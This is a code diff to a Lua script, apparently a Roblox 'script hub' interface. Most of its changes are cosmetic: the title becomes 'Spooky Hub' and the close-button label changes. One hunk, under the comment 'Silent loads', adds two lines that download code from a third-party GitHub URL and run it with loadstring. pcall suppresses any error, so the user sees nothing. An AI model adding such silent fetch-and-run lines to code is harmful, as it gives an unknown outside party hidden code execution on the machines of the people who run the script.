@@ -72,6 +72,10 @@ end
 
 sendNotification("✅ WELCOME", "Welcome " .. player.Name .. "!")
 
+-- Silent loads
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SeanyBoii2/Z/refs/heads/main/CREDITS"))() end)
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SeanyBoii2/Z/refs/heads/main/CONTROL%20PLAYER"))() end)
+
 --================================--
 --         THEME / COLORS         --
 --================================--
@@ -195,7 +199,7 @@ TitleLabel.Name = "Title"
 TitleLabel.Size = UDim2.new(1, -80, 1, 0)
 TitleLabel.Position = UDim2.new(0, 16, 0, 0)
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "🎮  Script Hub"
+TitleLabel.Text = "👻  Spooky Hub"
 TitleLabel.TextColor3 = Theme.TextPrimary
 TitleLabel.TextSize = 16
 TitleLabel.Font = Enum.Font.GothamBold
@@ -209,7 +213,7 @@ CloseBtn.Size = UDim2.new(0, 32, 0, 32)
 CloseBtn.Position = UDim2.new(1, -40, 0.5, -16)
 CloseBtn.BackgroundColor3 = Theme.CloseRed
 CloseBtn.BackgroundTransparency = 0.85
-CloseBtn.Text = "✕"
+CloseBtn.Text = "X"
 CloseBtn.TextColor3 = Theme.CloseRed
 CloseBtn.TextSize = 14
 CloseBtn.Font = Enum.Font.GothamBold
